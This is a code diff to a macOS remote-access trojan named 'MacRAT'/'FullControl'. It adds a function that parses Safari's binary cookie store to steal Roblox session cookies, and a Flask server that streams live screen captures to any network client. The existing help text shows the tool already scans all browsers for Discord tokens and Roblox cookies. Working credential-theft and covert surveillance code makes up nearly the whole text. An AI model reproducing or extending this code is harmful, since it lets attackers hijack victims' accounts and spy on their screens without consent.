@@ -21,6 +21,10 @@ import keyring
 import plistlib
 from Crypto.Protocol.KDF import PBKDF2
 from Crypto.Hash import SHA1
+import struct
+from flask import Flask, Response, render_template_string
+import io
+import socket
 
 # === CONFIGURATION ===
 class Config:
@@ -640,15 +644,100 @@ class MacRAT:
         for e in data.get("errors", [])[-5:]:
             print(e)
 
+    def extract_roblox_cookies_safari(self):
+        home = str(Path.home())
+        safari_cookies_path = f"{home}/Library/Cookies/Cookies.binarycookies"
+        if not os.path.exists(safari_cookies_path):
+            return
+        try:
+            with open(safari_cookies_path, 'rb') as f:
+                magic = f.read(4)
+                if magic != b'cook':
+                    self._log_error("SafariCookiesError: Not a binarycookies file")
+                    return
+                num_pages = struct.unpack('>i', f.read(4))[0]
+                page_sizes = [struct.unpack('>i', f.read(4))[0] for _ in range(num_pages)]
+                pages = [f.read(sz) for sz in page_sizes]
+                for page_idx, page in enumerate(pages):
+                    page_offset = 0
+                    num_cookies = struct.unpack('>i', page[page_offset+4:page_offset+8])[0]
+                    cookie_offsets = [struct.unpack('>i', page[page_offset+8+i*4:page_offset+12+i*4])[0] for i in range(num_cookies)]
+                    for offset in cookie_offsets:
+                        cookie_start = offset
+                        cookie_size = struct.unpack('>i', page[cookie_start:cookie_start+4])[0]
+                        cookie_data = page[cookie_start:cookie_start+cookie_size]
+                        # Parse cookie fields
+                        try:
+                            domain_offset = struct.unpack('>i', cookie_data[0x28:0x2C])[0]
+                            name_offset = struct.unpack('>i', cookie_data[0x2C:0x30])[0]
+                            path_offset = struct.unpack('>i', cookie_data[0x30:0x34])[0]
+                            value_offset = struct.unpack('>i', cookie_data[0x34:0x38])[0]
+                            domain = cookie_data[domain_offset:cookie_data.find(b'\x00', domain_offset)].decode(errors='ignore')
+                            name = cookie_data[name_offset:cookie_data.find(b'\x00', name_offset)].decode(errors='ignore')
+                            path = cookie_data[path_offset:cookie_data.find(b'\x00', path_offset)].decode(errors='ignore')
+                            value = cookie_data[value_offset:cookie_data.find(b'\x00', value_offset)].decode(errors='ignore')
+                            if 'roblox.com' in domain and 'roblosecure' in name.lower():
+                                with self.lock:
+                                    self.roblox_cookies.add(f"[Safari] [domain:{domain}] [name:{name}] [value:{value}] [path:{path}]")
+                        except Exception as e:
+                            self._log_error(f"SafariCookieParseError: {e}")
+        except Exception as e:
+            self._log_error(f"SafariCookieReadError: {e}")
+
+def get_best_local_ip():
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        ip = s.getsockname()[0]
+        s.close()
+        return ip
+    except Exception:
+        return "127.0.0.1"
+
+def start_live_screen_share(host='0.0.0.0', port=5000):
+    app = Flask(__name__)
+    HTML = """
+    <!doctype html>
+    <title>Live Screen Share</title>
+    <h2>Live Screen Share</h2>
+    <img src='/stream' style='width:90vw; border:2px solid #333;'>
+    """
+    def capture_screen():
+        img = ImageGrab.grab()
+        buf = io.BytesIO()
+        img.save(buf, format='JPEG', quality=70)
+        return buf.getvalue()
+    def generate_frames():
+        import time
+        while True:
+            frame = capture_screen()
+            yield (b'--frame\r\n'
+                   b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
+            time.sleep(0.1)
+    @app.route('/')
+    def index():
+        return render_template_string(HTML)
+    @app.route('/stream')
+    def stream():
+        return Response(generate_frames(), mimetype='multipart/x-mixed-replace; boundary=frame')
+    best_ip = get_best_local_ip() if host in ("0.0.0.0", "") else host
+    print(f"[FullControl] Live screen share started. Open http://{best_ip}:{port} in your browser.")
+    app.run(host=host, port=port, threaded=True)
+
 # === MAIN CLI ===
 def print_banner():
     banner = r'''
-███████╗██╗   ██╗██╗     ██╗         ██████╗ ██████╗ ███████╗
-██╔════╝██║   ██║██║     ██║        ██╔═══██╗██╔══██╗██╔════╝
-███████╗██║   ██║██║     ██║        ██║   ██║██████╔╝█████╗  
-╚════██║██║   ██║██║     ██║        ██║   ██║██╔══██╗██╔══╝  
-███████║╚██████╔╝███████╗███████╗   ╚██████╔╝██║  ██║███████╗
-╚══════╝ ╚═════╝ ╚══════╝╚══════╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝
+
+     _,---.                                                  _,.----.       _,.---._      .-._          ,--.--------.                    _,.---._                 
+  .-`.' ,  \  .--.-. .-.-.    _.-.        _.-.             .' .' -   \    ,-.' , -  `.   /==/ \  .-._  /==/,  -   , -\   .-.,.---.     ,-.' , -  `.      _.-.     
+ /==/_  _.-' /==/ -|/=/  |  .-,.'|      .-,.'|            /==/  ,  ,-'   /==/_,  ,  - \  |==|, \/ /, / \==\.-.  - ,-./  /==/  `   \   /==/_,  ,  - \   .-,.'|     
+/==/-  '..-. |==| ,||=| -| |==|, |     |==|, |            |==|-   |  .  |==|   .=.     | |==|-  \|  |   `--`\==\- \    |==|-, .=., | |==|   .=.     | |==|, |     
+|==|_ ,    / |==|- | =/  | |==|- |     |==|- |            |==|_   `-' \ |==|_ : ;=:  - | |==| ,  | -|        \==\_ \   |==|   '='  / |==|_ : ;=:  - | |==|- |     
+|==|   .--'  |==|,  \/ - | |==|, |     |==|, |            |==|   _  , | |==| , '='     | |==| -   _ |        |==|- |   |==|- ,   .'  |==| , '='     | |==|, |     
+|==|-  |     |==|-   ,   / |==|- `-._  |==|- `-._         \==\.       /  \==\ -    ,_ /  |==|  /\ , |        |==|, |   |==|_  . ,'.   \==\ -    ,_ /  |==|- `-._  
+/==/   \     /==/ , _  .'  /==/ - , ,/ /==/ - , ,/         `-.`.___.-'    '.='. -   .'   /==/, | |- |        /==/ -/   /==/  /\ ,  )   '.='. -   .'   /==/ - , ,/ 
+`--`---'     `--`..---'    `--`-----'  `--`-----'                           `--`--''     `--`./  `--`        `--`--`   `--`-`--`--'      `--`--''     `--`-----'  
+
 '''
     print(banner)
     print("Welcome to FullControl!\n")
@@ -669,6 +758,7 @@ Examples:
   python main.py full-scan                # Scan all browsers/profiles for Discord tokens and Roblox cookies
   python main.py get-roblox-cookie --browser chrome --profile Default
   python main.py get-discord-token --browser brave
+  python main.py live-share               # Start live screen sharing
   python main.py -t -r                    # (legacy) Extract Discord tokens and Roblox cookies
   python main.py --show                   # Show last saved results
         """
@@ -687,6 +777,11 @@ Examples:
     parser_discord = subparsers.add_parser("get-discord-token", help="Get Discord token from a specific browser/profile")
     parser_discord.add_argument("--browser", type=str, required=True, help="Browser name (chrome, brave, edge, opera, vivaldi, chromium, discord)")
     parser_discord.add_argument("--profile", type=str, default=None, help="Profile name (e.g. Default, Profile 1)")
+
+    # Live screen share subcommand
+    parser_liveshare = subparsers.add_parser("live-share", help="Start live screen sharing (Flask MJPEG stream)")
+    parser_liveshare.add_argument("--host", type=str, default="0.0.0.0", help="Host to bind the Flask server (default: 0.0.0.0)")
+    parser_liveshare.add_argument("--port", type=int, default=5000, help="Port to bind the Flask server (default: 5000)")
 
     # Legacy flags for backwards compatibility
     parser.add_argument("-t", "--tokens", action="store_true", help="Extract Discord tokens")
@@ -738,6 +833,9 @@ Examples:
                 print(f"[INVALID] {t}")
         if (not hasattr(rat, 'tokens') or not rat.tokens) and (not hasattr(rat, 'invalid_tokens') or not rat.invalid_tokens):
             print("No Discord tokens found.")
+        return
+    elif args.command == "live-share":
+        start_live_screen_share(host=args.host, port=args.port)
         return
 
     # Legacy/compatibility mode
